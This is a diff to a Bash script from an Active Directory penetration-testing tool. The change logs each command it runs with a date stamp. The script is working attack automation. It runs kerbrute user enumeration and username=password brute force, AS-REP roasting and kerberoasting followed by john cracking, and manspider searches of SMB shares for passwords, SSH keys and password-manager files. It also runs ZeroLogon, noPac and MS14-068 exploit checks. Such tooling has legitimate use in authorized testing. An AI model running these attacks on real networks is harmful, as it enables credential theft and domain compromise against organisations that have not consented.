     pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4| cut -d " " -f 2 | head -n 1)
@@ -980,7 +1053,9 @@ silenthound_enum () {
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/SilentHound
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-                ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} 2>&1 > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt
+                command="${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt
                 cd ${current_dir}
                 /bin/cp ${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt ${output_dir}/DomainRecon/servers_list_shd_${dc_domain}.txt 2>/dev/null
                 head -n 20 ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
@@ -1003,7 +1078,9 @@ ldeep_enum () {
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] ldeep does not support kerberos authentication${NC}"
             else
-                ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain} 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
+                command="${ldeep} ldap ${argument_ldeep} -s ldap://\"${target}\" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
             fi
         fi
     fi
@@ -1020,10 +1097,18 @@ windapsearch_enum () {
         else
             if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
-            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
-            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
-            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
-            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
             #Parsing user and computer lists
             /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
@@ -1047,7 +1132,9 @@ kerbrute_enum () {
             echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
         else
             echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
-            "${kerbrute}" userenum ${users_list} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute} > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
+            command="${kerbrute} userenum ${users_list} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt
             if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                 /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>&1
@@ -1074,7 +1161,9 @@ userpass_kerbrute_check () {
             for i in $(/bin/cat ${known_users_list}); do
                 echo -e "${i}:${i}" >> "${user_pass_wordlist}"
             done
-            "${kerbrute}" bruteforce "${user_pass_wordlist}" -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute} > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
+            command="${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt
             /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt"
             if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
@@ -1104,11 +1193,17 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                 users_scan_list=${users_list}
             fi
-            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} ${argument_ThePorgs} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
+            command="${impacket_GetNPUsers} ${dc_domain} -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} ${argument_ThePorgs}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
-            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs}
-            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            command="${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
+            command="${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
             #${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
         fi
         if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
@@ -1138,7 +1233,9 @@ asreprc4_attack () {
             if [ ! "${asrep_user}" == "" ]; then
                 current_dir=$(pwd)
                 cd ${output_dir}/Credentials
-                python3 ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679} | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt 2>&1
+                command="python3 ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
                 cd ${current_dir}
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
@@ -1160,7 +1257,9 @@ kerberoast_attack () {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} ${argument_ThePorgs} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
+                command="${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} ${argument_ThePorgs} ${dc_domain}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt
                 if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
@@ -1171,8 +1270,12 @@ kerberoast_attack () {
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}
-            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            command="${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
+            command="${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
             #${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt 2>&1
             if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
@@ -1193,7 +1296,9 @@ targetedkerberoast_attack () {
             echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt 2>&1
+            command="${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1210,9 +1315,13 @@ john_crack_asrep(){
             echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
             echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
-            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
+            command="$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
             echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
-            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
+            command="$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1229,9 +1338,13 @@ john_crack_kerberoast(){
             echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
             echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
-            $john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
+            command="$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
             echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
-            $john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
+            command="$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1251,7 +1364,9 @@ smb_map () {
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
             for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
                 echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
-                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt 2>&1
+                command="${smbmap} -H $i ${argument_smbmap}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt 
             done
 
             grep -iaH READ ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
@@ -1267,7 +1382,9 @@ smb_map () {
                     current_dir=$(pwd)
                     mkdir -p ${output_dir}/Shares/smbmapDump/${i}
                     cd ${output_dir}/Shares/smbmapDump/${i}
-                    ${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt 2>&1
+                    command="${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'"
+                    echo "$(date +%Y-%m-%d); $command" >> $command_log
+                    $command | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt 
                     cd ${current_dir}
                 fi
             done
@@ -1283,7 +1400,9 @@ shares_cme () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --shares --log ${output_dir}/Shares/cme_shares_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} --shares --log ${output_dir}/Shares/cme_shares_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1294,7 +1413,9 @@ spider_cme () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" --log ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M spider_plus -o OUTPUT=\"${output_dir}/Shares/cme_spider_plus\" EXCLUDE_DIR=\"prnproc$,IPC$,print$,SYSVOL,NETLOGON\" --log ${output_dir}/Shares/cme_spider_output${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1307,7 +1428,9 @@ finduncshar_scan () {
             echo -e "${PURPLE}[-] FindUncommonShares does not support PtH ${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            ${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt 2>&1
+            command="${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1320,17 +1443,29 @@ manspider_scan () {
     else
         smb_scan
         echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
-        ${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f "passw" "user" "admin" "account" "network" "login" "key" "logon" "cred" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f \"passw\" \"user\" \"admin\" \"account\" \"network\" \"login\" \"key\" \"logon\" \"cred\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for SSH keys${NC}"
-        ${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e "ppk" "rsa" "pem" "ssh" "rsa" -o -f "id_rsa" "id_dsa" "id_ed25519" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"ppk\" \"rsa\" \"pem\" \"ssh\" \"rsa\" -o -f \"id_rsa\" \"id_dsa\" \"id_ed25519\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
-        ${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e "bat" "com" "vbs" "ps1" "psd1" "psm1" "pem" "key" "rsa" "pub" "reg" "txt" "cfg" "conf" "config" "xml" "cspkg" "publishsettings" "json" "cnf" "sql" "cmd" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"bat\" \"com\" \"vbs\" \"ps1\" \"psd1\" \"psm1\" \"pem\" \"key\" \"rsa\" \"pub\" \"reg\" \"txt\" \"cfg\" \"conf\" \"config\" \"xml\" \"cspkg\" \"publishsettings\" \"json\" \"cnf\" \"sql\" \"cmd\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for Password manager files${NC}"
-        ${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e "kdbx" "kdb" "1pif" "agilekeychain" "opvault" "lpd" "dashlane" "psafe3" "enpass" "bwdb" "msecure" "stickypass" "pwm" "rdb" "safe" "zps" "pmvault" "mywallet" "jpass" "pwmdb" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"kdbx\" \"kdb\" \"1pif\" \"agilekeychain\" \"opvault\" \"lpd\" \"dashlane\" \"psafe3\" \"enpass\" \"bwdb\" \"msecure\" \"stickypass\" \"pwm\" \"rdb\" \"safe\" \"zps\" \"pmvault\" \"mywallet\" \"jpass\" \"pwmdb\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
-        ${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c "passw" "login" -e "docx" "xlsx" "xls" "pdf" "pptx" "csv" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c \"passw\" \"login\" -e \"docx\" \"xlsx\" \"xls\" \"pdf\" \"pptx\" \"csv\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
-        ${manspider} "${output_dir}/Shares/manspiderDump" -q -t 100 -c "passw" "key" "login" -l "${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt 2>&1
+        command="${manspider} \"${output_dir}/Shares/manspiderDump\" -q -t 100 -c \"passw\" \"key\" \"login\" -l \"${output_dir}/Shares/manspiderDump\""
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output${dc_domain}.txt
         echo -e ""
     fi
 }
@@ -1339,7 +1474,9 @@ manspider_scan () {
 nopac_check () {
     echo -e "${BLUE}[*] NoPac check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M nopac --log ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M nopac --log ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1
         if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
             echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
             echo -e "${CYAN}# Get shell:${NC}"
@@ -1354,7 +1491,9 @@ nopac_check () {
 petitpotam_check () {
     echo -e "${BLUE}[*] PetitPotam check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M petitpotam --log ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M petitpotam --log ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1
     done
     echo -e ""
 }
@@ -1362,7 +1501,9 @@ petitpotam_check () {
 dfscoerce_check () {
     echo -e "${BLUE}[*] dfscoerce check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M dfscoerce --log ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M dfscoerce --log ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1
     done
     echo -e ""
 }
@@ -1370,7 +1511,9 @@ dfscoerce_check () {
 zerologon_check () {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M zerologon --log ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M zerologon --log ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1
     done
     if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
@@ -1395,7 +1538,9 @@ ms14-068_check () {
             echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
         else
             if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] impacket's goldenPac does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
-            ${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip} 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
+            command="${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
             if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
                 echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
                 echo -e "${CYAN}# Execute command below to get shell:${NC}"
@@ -1413,7 +1558,9 @@ ms17-010_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 --log ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M ms17-010 --log ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1424,7 +1571,9 @@ spooler_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler --log ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M spooler --log ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1435,7 +1584,9 @@ printnightmare_check () {
         curr_targets="Domain Controllers"
